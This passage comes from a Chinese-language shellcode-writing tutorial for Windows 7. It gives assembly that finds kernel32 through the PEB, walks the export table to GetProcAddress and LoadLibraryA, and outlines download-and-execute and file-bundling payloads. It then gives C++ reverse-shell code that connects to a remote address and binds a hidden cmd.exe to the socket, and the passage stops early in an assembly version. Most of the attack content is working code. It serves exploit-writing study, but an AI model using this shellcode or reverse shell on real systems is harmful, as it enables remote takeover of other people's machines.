    ret
使用SASM调试，在结尾下断点，发现ebx已经成功赋值为了kernel的地址，与windbg显示的一致。（此处的汇编代码是之前在另一台机器上做的实验，所以kernel地址不同，希望不要引起争议）
使用命令!peb
如果需要在VS下编译，也可采用内联汇编实现。
    int _tmain(int argc, _TCHAR* argv[])
    {
    ​    int kernel32=0;
    ​    _asm{
    ​    xor ebx,ebx
    ​    mov ebx,fs:[0x30]
    ​    mov ebx,[ebx+0xc]
    ​    mov ebx,[ebx+0x14]
    ​    mov ebx,[ebx];ntdll
    ​    mov ebx,[ebx];kernel
    ​    mov ebx,[ebx+0x10];DllBase
    ​    mov kernel32,ebx
    ​    }
    ​    printf("kernel32=0x%x",kernel32);
    ​    getchar();
    ​    return 0;
    }
上述代码中（SASM），比较需要注意的第15行为ebx+0x10而不是0x18（_LDR_DATA_TABLE_ENTRY结构中标准的DllBase偏移）  
主要原因是InMemoryOrderLinks的指针指向的是下一个_LDR_DATA_TABLE_ENTRY的InMemoryOrderLinks（结构偏移0x08），所以需要该地址减去-0x8才是正确的文件头（图中案例0x954dd0-0x8）  
所以当ebx存放InMemoryOrderLinks的指针时，要获取DllBase需要偏移0x18-0x8=0x10
至此我们已经获取到了kernel32.dll的基地址，获取这个地址的方法还有很多方法，使用SEH、TEB都可以间接获取Kerne32的地址，如果有需要可以参考《Exploit编写系列教程》。还有需要注意的是不同系统下，某些获取方法可能会失效，这次实验的测试环境（Win7）下的寻址就和之前的系统有一些不同，所以可能不会向前兼容，不过通过windbg对单个系统进行符号调试，是很容易发现区别的并且修改方案。
###  2\. 获取函数地址
在理解这部分之前，我们首先需要对PE格式有一定的了解。就从我们刚才获取了基地址的Kernel32作为基础，一步步看如何获取系统API函数的地址。
首先从DOS头开始，Windbg能够使用符号表来对地址进行解析。  
解析_IMAGE_DOS_HEADER结构，我们只需要了解e_lfanew字段，指向PE头，该字段在在DOS头偏移0x3c的位置。
之前的kernel基址加上e_lfanew字段的偏移（0n开头表示十进制）是指向PE头的指针。
获取了PE头指针，我们即可以使用windbg解析PE头的_IMAGE_NT_HEADERS结构  
_IMAGE_FILE_HEADER 是一个结构体，包含代码数目、机器类型以及特征等信息。  
而我们这里需要使用的结构体是_IMAGE_OPTIONAL_HEADER
继续利用windbg分析，经过两次分析，现在的读者应该也已经轻车熟路了。
分析_IMAGE_OPTIONAL_HEADER，其包含以下几个信息。
很显然，偏移0x60的DataDirectory段就是函数导出表的偏移。
    AddressOfEntryPoint：exe/dll 开始执行代码的地址，即入口点地址。 
    ImageBase：DLL加载到内存中的地址，即映像基址。 
    DataDirectory-导入或导出函数等信息。
继续解析这个结构，终于获取到了这个结构到VA。
因为我们之前的解析都没有用到指针，所以可以一起算VA偏移PE头一共0x78字节（240是PE偏移DOS，是动态获取）
获取到DATA DIRECTORY结构到VirtualAddress地址  
我们关心的主要有三个数组结构
    AddressOfFunctions：指向一个DWORD类型的数组，每个数组元素指向一个函数地址。 
    AddressOfNames：指向一个DWORD类型的数组，每个数组元素指向一个函数名称的字符串。 
    AddressOfNameOrdinals：指向一个WORD类型的数组，每个数组元素表示相应函数的排列序号
AddressOfNames的结构是一个数组指针，每个机器位（4字节）都指向一个函数名的字符串。  
所以我们可以通过遍历这个数组，结合字符串匹配获取到该函数的序号。
AddressOfNameOrdinals存放这对应函数的索引值，在获取了函数的序号之后，按照序号查找函数索引值。  
需要注意的是每个索引值占2字节。  
例如第三个函数ActivateActCtx函数的索引值为4
AddressOfFunctions则根据索引排序，存放着函数的地址。  
地址加上0x10[索引4字节*指针4字节]存放ActivateActCtx函数的偏移地址。
我们使用汇编来实现这一过程，接着上面的汇编代码，此时的EBX存放Kernel32的地址。
    ;从Kernel32的PE头，获取DATA DIRECTORY的地址
            ;Get address of GetProcessAddress
            mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
            add edx,ebx ;PE HEADER 
            mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
            add edx,ebx ;EDX=DATA DIRECTORY
    ;将字符串与AddressOfNames    数组匹配，获得函数的序号
            ;compare string 
            xor ecx,ecx
            mov esi,[edx+0x20]
            add esi,ebx
    Get_Func:
            inc ecx
            lodsd ;mov eax,esi;esi+=4
            add eax,ebx;
            cmp dword ptr[eax],0x50746547 ;GetP
            jnz Get_Func
            cmp dword ptr[eax+0x4],0x41636f72;proA
            jnz Get_Func
            cmp dword ptr[eax+0x8],0x65726464 ;ddre
            jnz Get_Func
        ;通过序号在AddressOfNameOrdinals中获取索引    
            ;get address
            mov esi,[edx+0x24] ;AddressOfNameOrdinals
            add esi,ebx
            mov cx,[esi+ecx*2];num
            dec ecx 
    ;通过索引在AddressOfFunctions中获取函数地址，存放于EDX
            mov esi,[edx+0x1c];AddressOfFunctions
            add esi,ebx
            mov edx,[esi+ecx*4] 
            add edx,ebx ;EDX = GetProcAddress
此时我们已经获取了GetProcAddress函数的地址，所有关于PE文件的内容到这里也就结束了，之后我们就可以想C语言一样非常容易地调用一个函数。我们已经度过了编写shellcode最黑暗的过程，接下来迎接着我们的将是一条康庄大道。
通过GetProcAddress，我们首先可以使用获取LoadLibrary函数的地址，该函数可以用来加载user32模块，同时获取其基地址。这部分就比较简单了，直接贴代码。
    ;Get LoadLibrary
            xor ecx,ecx
            push ebx ;Kernel32 入栈备份
            push edx ;GerProcAddress 入栈备份
            push ecx ;0
            push 0x41797261 ; aryA
            push 0x7262694c ; Libr
            push 0x64616f4c ; Load 
            push esp;"LoadLibraryA"
            push ebx ;
            call edx ;GerProcAddress(Kernel32,"LoadLibraryA")
            add esp,0xc ;pop "LoadLibraryA"
            pop ecx; ECX=0
            push eax ;EAX=LoadLibraryA
            push ecx
            mov cx, 0x6c6c  ; ll
            push ecx
            push 0x642e3233 ; 32.d
            push 0x72657375 ; user
            push esp        ; "user32.dll"
            call eax        ; LoadLibrary("user32.dll")
到这里，有一定汇编和WIN32基础的读者已经可以编写shellcode逻辑了，思路即通过GetPrcAddress函数获取需要的函数地址，能结合完成各项功能，剩下的部分就需要读者发挥自己天才的想象力了。
文末会提供一个完整编写的shellcode作为案例。
## 0x03三种经典的shellcode形式
Shellcode在功能性上的实现，主要分为以下三大类  
分别是下载恶意文件执行、程序本身捆绑文件还有直接反弹shell获得控制权  
在内核层面则还有提权等操作，这里只对应用层shellcode功能实现做一个归类。
### （1）下载执行
调用URLDownloadToFile函数下载恶意文件到本地，并且使用Winexec执行  
函数原型
    HRESULT URLDownloadToFile( 
    LPUNKNOWN pCaller, 
    LPCTSTR szURL, 
    LPCTSTR szFileName, 
    _Reserved_ DWORD dwReserved, 
    LPBINDSTATUSCALLBACK lpfnCB 
    );
### （2）捆绑
通过GetFileSize获取文件句柄，获取释放路径（GetTempPathA），设置好文件指针（SetFilePoint），使用VirtualAlloc在内存中申请一块内存，再将数据读取（ReadFile）写入到本地文件（CreateFIle
WriteFile），最后在对该文件执行。
### （3）反弹shell
反弹shell属于无文件攻击，使用socket远程获得对方的cmd.exe。优点是不容易留下日志，适合渗透测试中使用，缺点也很明显，维持连接的稳定性较差。
在Windows下实现反弹shell，比Linux多了一个步骤，启动或者初始化winsock库，之后创建cmd.exe进程然后TCP连接端口/打开监听方法都是相近的。
需要注意的使用C编程可以使用Socket结合双管道进行通信，但是用汇编管道编写比较麻烦。不建议使用管道来进行通信。解决方案是使用WSASocket代替Socket，这个函数支持IO重叠。
函数原型
    SOCKET WSASocket (
      int af, 
      int type, 
      int protocol, 
      LPWSAPROTOCOL_INFO lpProtocolInfo, 
      GROUP g, 
      DWORD dwFlags 
      );
这里我们主要针对第三种功能，实现一个无管道的反弹shell代码。  
因为篇幅较长，这里使用C++实现，接下来只需要用汇编调用函数实现即可。  
本部分参考博客：
实现环境
> WIN7 SP1  
>  VS2010
首先实现一个TCP连接，使用nc做连接测试。
WSASocket的使用与Socket基本一致，多出来的参数设置为NULL即可。
包含头文件WinSock2.h和winsock.h
    //初始化WSA套接字
    WSADATA wsd;
        WSAStartup(0x0202,&wsd);
        SOCKET socket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
        SOCKADDR_IN sin;
        sin.sin_addr.S_un.S_addr=inet_addr(REMOTE_ADDR);
        sin.sin_port=htons(REMOTE_PORT);
        sin.sin_family=AF_INET;
    //连接远程的服务端，发送验证代码
        connect(socket,(sockaddr*)&sin,sizeof(sin));
        send(socket,"[+]Hello!n",strlen("[+]Hello!n"),0);
    接下来将使用CreateProcess为cmd.exe创建子进程，然后将标准输入、标准输出、标准错误输出都绑定到socket上。（这部分在Linux下实现比起Windows就简单多了，可以直接重定向）
    //创建cmd进程
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        GetStartupInfo(&si);
        si.cb=sizeof(STARTUPINFO);
        si.hStdInput=si.si.hStdOutput=si.hStdError=(HANDLE)socket; //将标准输入输出绑定到Socket
        si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow=SW_HIDE;
        TCHAR cmdline[255]=L"cmd.exe";
        while(!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)){ //创建进程，第五个参数TRUE子进程继承父进程的所有句柄
        Sleep(1000);
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
在汇编编写中，可以讲首先计算出关键函数和DLL的基地址并且放入栈帧，方便随时调用。
socket类的函数（WSAStartup、connect）如果执行成功EAX会返回0，如果失败会返回-1（0xFFFFFFFF）
以上程序实现函数的来源
**_Kernel32.dll_**
    CreateProcessA
    GetStartupInfoA
    LoadLibraryA
**_ws2_32.dll_**
    WSAStartup
    WSASocketA
    connect
使用汇编编写
初始化部分（代码量较大，仅做参考，速读的读者可以暂时跳过这部分）
    nop
            nop
            nop
            ;get the address of kernel32.dll
            xor ecx,ecx
            mov eax,fs:[0x30];EAX=PEB
            mov eax,[eax+0xc];EAX=PEB->LDR
            mov esi,[eax+0x14];ESI=PEB->Ldr.lnMemOrder
            lodsd     ;mov eax,[esi];esi+=4;EAX=SecondMod->ntdll
            xchg eax,esi 